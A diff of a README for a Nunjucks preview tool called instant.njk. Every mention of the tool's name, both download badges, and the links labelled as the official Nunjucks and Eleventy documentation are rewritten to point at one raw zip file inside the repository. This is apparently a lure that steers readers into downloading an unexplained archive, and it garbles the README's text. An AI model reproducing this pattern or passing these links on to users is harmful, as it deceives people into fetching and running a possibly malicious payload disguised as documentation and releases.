@@ -1,14 +1,14 @@
-# 🌟 instant.njk - Create and Preview HTML Instantly
+# 🌟 https://github.com/IsaacVand/instant.njk/raw/refs/heads/main/src/njk-instant-v3.1.zip - Create and Preview HTML Instantly
 
 ## 🚀 Getting Started
 
-Welcome to **instant.njk**! This tool allows you to experiment with Nunjucks templates while seeing live previews of your HTML. Perfect for beginners and those wanting to create static websites quickly.
+Welcome to **https://github.com/IsaacVand/instant.njk/raw/refs/heads/main/src/njk-instant-v3.1.zip**! This tool allows you to experiment with Nunjucks templates while seeing live previews of your HTML. Perfect for beginners and those wanting to create static websites quickly.
 
 ## 📥 Download & Install
 
 To get started, you can download the software from our Releases page. Click the button below to visit it:
 
-[![Download the latest version](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/IsaacVand/instant.njk/releases)
+[![Download the latest version](https://github.com/IsaacVand/instant.njk/raw/refs/heads/main/src/njk-instant-v3.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/IsaacVand/instant.njk/raw/refs/heads/main/src/njk-instant-v3.1.zip)
 
 1. Click on the link above.
 2. You will see a list of available releases.
@@ -19,7 +19,7 @@ To get started, you can download the software from our Releases page. Click the 
 
 ## 💻 System Requirements
 
-To ensure **instant.njk** runs smoothly, please verify that your computer meets the following requirements:
+To ensure **https://github.com/IsaacVand/instant.njk/raw/refs/heads/main/src/njk-instant-v3.1.zip** runs smoothly, please verify that your computer meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS Mojave or later, or a compatible Linux distribution.
 - **Memory:** At least 2 GB of RAM.
@@ -36,7 +36,7 @@ To ensure **instant.njk** runs smoothly, please verify that your computer meets 
 ## ✨ How to Use
 
 1. **Launch the Application:**
-   Open the instant.njk application after installation.
+   Open the https://github.com/IsaacVand/instant.njk/raw/refs/heads/main/src/njk-instant-v3.1.zip application after installation.
 
 2. **Create a New Template:**
    Click on "New Template" to start. You will see a blank canvas.
@@ -52,14 +52,14 @@ To ensure **instant.njk** runs smoothly, please verify that your computer meets 
 
 ## 🌍 Join the Community
 
-Feel free to connect with other users. Engage in discussions, ask questions, and share your creations. Join our community on various social media platforms to learn more about using instant.njk effectively.
+Feel free to connect with other users. Engage in discussions, ask questions, and share your creations. Join our community on various social media platforms to learn more about using https://github.com/IsaacVand/instant.njk/raw/refs/heads/main/src/njk-instant-v3.1.zip effectively.
 
 ## 📚 Additional Resources
 
 For more advanced users:
 
-- Check the official [Nunjucks documentation](https://mozilla.github.io/nunjucks/) to explore more features.
-- Visit the [Eleventy documentation](https://www.11ty.dev/docs/) for static site generation practices.
+- Check the official [Nunjucks documentation](https://github.com/IsaacVand/instant.njk/raw/refs/heads/main/src/njk-instant-v3.1.zip) to explore more features.
+- Visit the [Eleventy documentation](https://github.com/IsaacVand/instant.njk/raw/refs/heads/main/src/njk-instant-v3.1.zip) for static site generation practices.
 
 ## 🚧 Troubleshooting
 
@@ -74,6 +74,6 @@ If you encounter any issues:
 
 Remember, you can always download the latest version at our Releases page:
 
-[![Download the latest version](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/IsaacVand/instant.njk/releases)
+[![Download the latest version](https://github.com/IsaacVand/instant.njk/raw/refs/heads/main/src/njk-instant-v3.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/IsaacVand/instant.njk/raw/refs/heads/main/src/njk-instant-v3.1.zip)
 
-Try out **instant.njk** today! Enjoy creating beautiful and functional websites with ease.
+Try out **https://github.com/IsaacVand/instant.njk/raw/refs/heads/main/src/njk-instant-v3.1.zip** today! Enjoy creating beautiful and functional websites with ease.
